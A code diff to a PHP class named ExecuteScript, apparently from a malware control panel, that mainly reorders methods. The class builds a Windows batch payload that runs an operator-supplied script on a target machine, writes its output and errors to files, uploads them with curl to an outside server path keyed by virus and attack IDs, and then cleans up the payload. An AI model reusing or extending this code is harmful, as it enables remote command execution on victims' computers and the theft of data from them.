@@ -18,28 +18,48 @@ class ExecuteScript extends AttackBase {
     private string $script = "";
     private string $error = "";
 
-    public function setScript(string $script): void {
-        $this->script = $script;
-    }
-
     public function getScript(): string {
         return $this->script;
     }
 
-    public function setData(string $data): void {
-        $this->data = $data;
+    public function setScript(string $script): void {
+        $this->script = $script;
     }
 
     public function getData(): string {
         return $this->data;
     }
 
-    public function setError(string $error): void {
-        $this->error = $error;
+    public function setData(string $data): void {
+        $this->data = $data;
     }
 
     public function getError(): string {
         return $this->error;
+    }
+
+    public function setError(string $error): void {
+        $this->error = $error;
+    }
+
+    public function generateBatchCode(): string {
+        ob_start(); //@formatter:off ?>
+        chCp 65001
+        echo _>%~pd0data
+        echo _>%~pd0err
+        <?php echo $this->script . "\n";
+        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
+        echo BaseScriptWin::cleanUpPayload();
+        return ob_get_clean(); //@formatter:on
+    }
+
+    private function generateUploadCode(): string {
+        ob_start(); ?>
+        curl --form "dataFile=@%~pd0data" --form "errFile=@%~pd0err" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
+        <?php return ob_get_clean();
+    }
+
+    public function processExtras(string $resourceIdentifier): void {
     }
 
     protected function setState(string $json): void {
@@ -55,25 +75,5 @@ class ExecuteScript extends AttackBase {
         $state["error"] = $this->error;
         $state["script"] = $this->script;
         return json_encode($state);
-    }
-
-    private function generateUploadCode(): string {
-        ob_start(); ?>
-        curl --form "dataFile=@%~pd0data" --form "errFile=@%~pd0err" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
-        <?php return ob_get_clean();
-    }
-
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
-        chCp 65001
-        echo _>%~pd0data
-        echo _>%~pd0err
-        <?php echo $this->script . "\n";
-        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
-        echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
-    }
-
-    public function processExtras(string $resourceIdentifier): void {
     }
 }
